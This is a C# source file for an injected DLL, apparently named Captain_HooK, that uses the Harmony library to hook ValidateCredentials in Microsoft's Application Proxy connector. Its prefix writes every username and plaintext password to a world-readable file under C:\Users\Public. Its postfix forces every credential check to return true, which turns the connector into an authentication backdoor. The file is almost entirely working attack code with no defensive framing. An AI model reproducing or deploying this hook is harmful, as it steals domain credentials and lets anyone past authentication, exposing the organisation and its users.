using System;
using System.IO;
using System.Reflection;
using HarmonyLib;

namespace Captain_HooK
{
    public class HooK
    {
        private static void LogToFile(string message)
        {
            string path = @"C:\Users\Public\hook.txt";
            using (StreamWriter sw = new StreamWriter(path, true))
            {
                sw.WriteLine(message);
            }
        }

        public static int InstallHook(string TestParam)
        {
            try
            {
                LogToFile("C# DLL Injected Successfully!");
                Type targetType = typeof(Microsoft.ApplicationProxy.Connector.DirectoryHelpers.ActiveDirectoryDomainContext);

                // Get the method to be patched
                MethodInfo targetMethod = targetType.GetMethod("ValidateCredentials", BindingFlags.Public | BindingFlags.Instance);
                if (targetMethod == null)
                    throw new Exception("Could not resolve ValidateCredentials");

                LogToFile("Got Function!");

                Harmony harmony = new Harmony("ValidateCredentialsPatch");
                MethodInfo prefixMethod = typeof(HooK).GetMethod("Prefix_ValidateCredentials");
                MethodInfo postfixMethod = typeof(HooK).GetMethod("Postfix_ValidateCredentials");
                harmony.Patch(targetMethod, new HarmonyMethod(prefixMethod), new HarmonyMethod(postfixMethod));

                LogToFile("Waiting for connection...");
                LogToFile("------------------------------------------");

                return 0;
            }
            catch (Exception ex)
            {
                LogToFile($"Exception: {ex.Message}");
                return -1;
            }
        }

        public static bool Prefix_ValidateCredentials(ref string userPrincipalName, ref string password, ref object __result)
        {
            LogToFile($"[+] Username: {userPrincipalName}");
            LogToFile($"[+] Password: {password}");
            LogToFile("------------------------------------------");
            return true; // Do not skip executing original ValidateCredentials()
        }

        public static void Postfix_ValidateCredentials(ref bool __result)
        {
            __result = true; // Always return true
            LogToFile("Postfix hook executed, result set to true.");
        }
    }
}
